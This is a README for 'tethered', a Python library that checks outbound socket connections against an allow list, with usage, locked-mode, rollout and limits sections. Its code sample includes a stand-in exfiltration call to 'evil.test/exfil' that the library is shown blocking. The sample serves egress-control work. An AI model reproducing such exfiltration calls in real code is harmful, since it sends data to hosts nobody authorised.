<p align="center">
  <img src="docs/assets/tethered-mark.svg" alt="tethered" width="456">
</p>

<h1 align="center">Runtime network egress control for Python</h1>

<p align="center">
  One function call. Zero dependencies. No infrastructure changes.
</p>

<p align="center">
  <a href="https://pypi.org/project/tethered/"><img src="https://img.shields.io/pypi/v/tethered?style=flat-square&labelColor=18181b&color=fb923c" alt="PyPI version"></a>
  <a href="https://pypi.org/project/tethered/"><img src="https://img.shields.io/pypi/pyversions/tethered?style=flat-square&labelColor=18181b&color=fb923c" alt="Python versions"></a>
  <a href="https://pypi.org/project/tethered/"><img src="https://img.shields.io/pypi/dm/tethered?style=flat-square&labelColor=18181b&color=fb923c&label=downloads" alt="Downloads per month"></a>
  <a href="https://github.com/shcherbak-ai/tethered/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/shcherbak-ai/tethered/ci.yml?branch=main&style=flat-square&labelColor=18181b&label=CI" alt="CI"></a>
  <a href="https://github.com/shcherbak-ai/tethered/actions/workflows/ci.yml"><img src="https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/SergiiShcherbak/20432f86c9102aa2b77ad9e4d4c21aa6/raw/tethered-coverage.json&style=flat-square&labelColor=18181b&color=fb923c" alt="Coverage"></a>
</p>

<p align="center">
  <a href="https://tethered.shcherbak.ai/API/"><strong>API</strong></a> ·
  <a href="https://tethered.shcherbak.ai/COOKBOOK/"><strong>Cookbook</strong></a> ·
  <a href="https://tethered.shcherbak.ai/COMPATIBILITY/"><strong>Compatibility</strong></a> ·
  <a href="https://tethered.shcherbak.ai/security/"><strong>Security</strong></a>
</p>

<p align="center">
  <img src="docs/assets/tethered-figure.svg" alt="One call sets the allow list: the application reaches api.stripe.com and db.internal, and its connection to evil.test is blocked." width="600">
</p>

tethered checks every connection made through Python's socket layer against your allow list, from inside the process, before the connection is opened. `activate()` sets the ceiling for the whole process; `scope()` narrows a single code path.

```python
import tethered

tethered.activate(allow=["*.stripe.com", "db.internal"])

import urllib.request
urllib.request.urlopen("https://api.stripe.com/v1/charges")  # allowed: matches *.stripe.com
urllib.request.urlopen("https://evil.test/exfil")            # raises tethered.EgressBlocked
```

## Why

Your code, your dependencies and AI-generated code share one Python process, and any of them can open a connection you never intended. Firewalls, network policies and proxies can stop that, but they take a platform team, a separate service or admin rights. tethered takes one line of Python. It complements those controls and does not replace them.

| Supply-chain defense | AI agent guardrails | Least privilege |
|---|---|---|
| A dependency that phones home through Python's networking is stopped: the process reaches the hosts you listed and nothing else. | Code an agent wrote runs under the same allow list as the rest of the process, in production and in your test suite. | `scope()` holds a request handler, a background job or a library call to the destinations it needs. |

The check adds about 25 µs to a connection ([measurements](https://tethered.shcherbak.ai/ARCHITECTURE/#performance)).

## Install

```bash
uv add tethered
```

Or `pip install tethered`. Python 3.11+ on Linux, macOS and Windows, with no runtime dependencies. Wheels are prebuilt; a source install needs a C compiler.

Upgrading from 0.5.x? 1.0 refuses to run where 0.5.x went on without enforcing, so a deployment can stop at start-up after the upgrade. Read the [migration guide](https://tethered.shcherbak.ai/migrating-to-v1/) first.

## Quick start

### Protect the process

```python
# main.py, wsgi.py, manage.py: your entry point
import tethered

tethered.activate(allow=["*.stripe.com:443", "db.internal:5432"])

from myapp import create_app  # import the application afterwards
app = create_app()
```

Activate first, before your application and its dependencies are imported. Connections that are already open keep working, and worker processes that already exist are not reached.

### Narrow a code path

```python
import httpx
import tethered

@tethered.scope(allow=["*.stripe.com:443"])
def charge(amount: int, token: str) -> dict:
    # this function, and everything it calls, reaches *.stripe.com:443 only
    return httpx.post("https://api.stripe.com/v1/charges", ...).json()
```

A scope is a decorator or a `with` block, for sync and async code, and it works without `activate()`. With both in place a connection must be allowed by both: a scope narrows the policy and never widens it.

Writing a library? Use tethered in your tests, and leave both `activate()` and `scope()` to the application, which owns the process ([guide for package authors](https://tethered.shcherbak.ai/COOKBOOK/#for-package-authors)).

### Child processes

Python children started with the same interpreter inherit the policy as they start: `multiprocessing` and `ProcessPoolExecutor` workers, gunicorn and uvicorn workers, `subprocess.run([sys.executable, ...])`. A child launched through `subprocess` inside a scope inherits the scope too.

Every other launch (`curl`, another interpreter, `python -S`) is external: logged by default, refused with `external_subprocess_policy="block"`. The rules are on the [subprocess page](https://tethered.shcherbak.ai/SUBPROCESS/).

### Lock it down in production

```python
tethered.activate(
    allow=["api.stripe.com:443", "db.internal:5432"],
    locked=True,                         # replacing or switching off the policy takes the token
    lock_token=object(),                 # ... and nobody keeps it
    fail_closed=True,                    # an error inside the check blocks instead of allowing
    external_subprocess_policy="block",  # no shelling out to a program that does the egress
)
```

Under a lock, tampering with tethered's own code or with the active policy is detected and fails closed, and a Python child that cannot establish the locked policy refuses to start. Activate before importing third-party code: whatever runs earlier is not covered.

`"block"` also stops the helper programs some libraries launch when they are imported, so import those first ([details](https://tethered.shcherbak.ai/SUBPROCESS/#what-block-also-refuses)). Locked mode is not a sandbox: the [security model](https://tethered.shcherbak.ai/security/#locked-mode--what-it-does-and-does-not-do) lists what it checks and what it does not stop.

### Roll it out

1. **Check the environment.** `python -m tethered check`, run where the application runs, lists what tethered would refuse there, what it would not see and what needs configuration. It changes nothing ([the check](https://tethered.shcherbak.ai/API/#preflight-check)).
2. **Enforce in your tests.** Activate the policy, locked, from a session fixture in `conftest.py` ([example](https://tethered.shcherbak.ai/COOKBOOK/#use-tethered-in-your-tests)). A test that reaches a host you did not list fails, and production is not touched.
3. **Observe in production** with `log_only=True`: every connection the policy would refuse is logged, and none is refused. The audit hook is installed all the same, each allowed host name is looked up a second time, and Python children inherit the policy. What tethered does not see is not logged ([log-only mode](https://tethered.shcherbak.ai/API/#log-only-mode)).
4. **Enforce** once the log shows nothing the application needs: drop `log_only`.
5. **Lock it** ([above](#lock-it-down-in-production)).

## Allow list syntax

| Rule | Matches |
|---|---|
| `"api.stripe.com"` | That host, on any port |
| `"*.stripe.com"` | Any subdomain, `a.b.stripe.com` included; not `stripe.com` itself |
| `"api.stripe.com:443"` | That host on port 443 only |
| `"198.51.100.1"`, `"10.0.0.0/8"` | An IPv4 address; a CIDR range |
| `"10.0.0.0/8:5432"` | A CIDR range on one port |
| `"[2001:db8::1]:443"`, `"[2001:db8::]/32"` | IPv6, in brackets where a port or a prefix follows |

Wildcards follow Python's `fnmatch` and match text, not address ranges: `10.*` also allows `10.attacker.example`, so use CIDR for ranges. Localhost is allowed unless you pass `allow_localhost=False`. A malformed rule raises `ValueError` when the policy is set. The full syntax is in the [API reference](https://tethered.shcherbak.ai/API/#allow-list-syntax).

## Limits

- **A guardrail, not a sandbox.** tethered works at Python's audit-event layer. Code that goes below it (`ctypes`, `cffi`, a C extension making its own system calls) is not stopped, with or without locked mode. Where you need a guarantee, combine tethered with a control below Python: an egress proxy or a network policy that names the allowed hosts, containers, seccomp, network namespaces. The [security model](https://tethered.shcherbak.ai/security/) has the full threat model.
- **Libraries that connect in C are not seen.** tethered sees what goes through Python's `socket` module: requests, httpx, urllib3, aiohttp and the pure-Python database and broker clients. A library that resolves and connects inside its own C code (psycopg2, pycurl, grpcio) is not checked. The [compatibility page](https://tethered.shcherbak.ai/COMPATIBILITY/) says what was measured, server by server and library by library.
- **Under asyncio, the standard event loop only.** A uvloop event loop raises no audit events, so tethered refuses to enforce a policy next to it, and uvicorn picks uvloop whenever it is installed. Name the loop (`uvicorn main:app --loop asyncio`) or activate in a launcher script before the server is imported ([server setup](https://tethered.shcherbak.ai/COOKBOOK/#servers-and-interpreter-pools)).
- **On Windows, run asyncio on `asyncio.SelectorEventLoop`.** The default `ProactorEventLoop` connects through calls that raise no audit event, so only DNS-time hostname checks apply there.
- **Free-threaded Python runs with the GIL once a policy is active.** tethered's C extension does not declare free-threading support, so Python turns the GIL back on when it is loaded: by `activate()`, and in a child process that inherits a policy or a scope. Importing tethered and entering a `scope()` do not load it.

## Documentation

The documentation is at [tethered.shcherbak.ai](https://tethered.shcherbak.ai/), with an index for language models and coding agents at [llms.txt](https://tethered.shcherbak.ai/llms.txt).

- [API reference](https://tethered.shcherbak.ai/API/): `activate`, `scope`, `deactivate`, the exceptions, locked and log-only mode
- [Cookbook](https://tethered.shcherbak.ai/COOKBOOK/): what each server, task queue and pool needs; handling a blocked connection in Django, FastAPI and Celery; scopes in an application; tethered in a library's tests
- [Compatibility](https://tethered.shcherbak.ai/COMPATIBILITY/): what is enforced, what needs configuration and what is not seen, measured under real servers, task queues and client libraries
- [Subprocess control](https://tethered.shcherbak.ai/SUBPROCESS/): how a policy and a scope reach child processes, and `external_subprocess_policy`
- [Architecture](https://tethered.shcherbak.ai/ARCHITECTURE/): the audit hook, scopes, the C guardian, measured overhead
- [Security model](https://tethered.shcherbak.ai/security/): the threat model, what tethered does and does not protect against, what locked mode adds
- [Migrating to 1.0](https://tethered.shcherbak.ai/migrating-to-v1/): upgrading from 0.5.x, with the breaking changes by what a deployment uses and what to do about each
- [Changelog](https://tethered.shcherbak.ai/changelog/): what changed in each release
- [Examples](examples/): twelve runnable scripts, one for each feature
- [Contributing](CONTRIBUTING.md): development setup and guidelines

## License

[MIT](LICENSE)

## More from shcherbak_ai

<!-- markdownlint-disable MD033 -->
<table>
  <tr>
    <td width="50%" align="center" valign="top">
      <a href="https://github.com/shcherbak-ai/contextgem"><img src="assets/contextgem-wordmark.svg" alt="ContextGem" width="336"></a><br>
      Structured extraction from documents with LLMs.
    </td>
    <td width="50%" align="center" valign="top">
      <a href="https://github.com/shcherbak-ai/licenseal"><img src="assets/licenseal-wordmark.svg" alt="licenseal" width="336"></a><br>
      License compatibility checks for dependency trees, fast enough for CI.
    </td>
  </tr>
</table>
<!-- markdownlint-enable MD033 -->

Questions or collaboration ideas? Reach out on [LinkedIn](https://www.linkedin.com/in/sergii-shcherbak-10068866/) or [X](https://x.com/seshch). Built with ❤️ in Oslo, Norway.
